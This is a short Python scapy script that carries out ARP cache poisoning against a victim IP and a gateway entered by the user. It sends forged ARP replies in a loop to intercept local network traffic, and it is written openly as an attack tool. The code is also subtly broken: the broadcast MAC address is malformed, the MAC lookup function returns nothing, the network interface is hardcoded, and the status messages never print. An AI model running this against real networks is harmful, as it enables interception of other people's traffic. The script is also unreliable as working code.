import sys
from scapy.all import *

def getOwnMacIP(iface):
    ipOwn = get_if_addr(iface)
    macOwn = get_if_hwaddr(iface)
    return ipOwn, macOwn

def getMacAddress(ipAdd, iface):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff:ff")
    received = srp(packet, iface=iface, timeout=2)

def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof):
    # Build Packet
    arp = Ether()/ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macTarget
    arp[ARP].pdst = ipTarget

    # Send Packet
    sendp(arp, iface="enp0s3")

def attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode):
    if (opMode == 0):
        try:
            ("Initialised ARP Poisoning...")
            while True:
                sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway)
                sendPoisonPacket(ipAttacker, macAttacker, ipGateway, macGateway, ipVictim)
                time.sleep(2)
        except KeyboardInterrupt:
            print("Stopped ARP Poisoning")
    elif (opMode == 1):
        try:
            ("Initialised ARP Poisoning...")
            while True:
                sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway)
                time.sleep(2)
        except KeyboardInterrupt:
            print("Stopped ARP Poisoning")

# User input provides network interface, IP addresses
iface = raw_input("Enter Network Interface: ")
ipVictim = raw_input("Enter Victim IP: ")
ipGateway = raw_input("Enter Gateway IP: ")
opMode = int(raw_input("Enter Operational Mode (0: silent, 1: all out): "))

# Find IP and MAC addresses
ipAttacker, macAttacker = getOwnMacIP(iface)
macGateway = getMacAddress(ipGateway, iface)
macVictim = getMacAddress(ipVictim, iface)

# Send poison packets
attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode)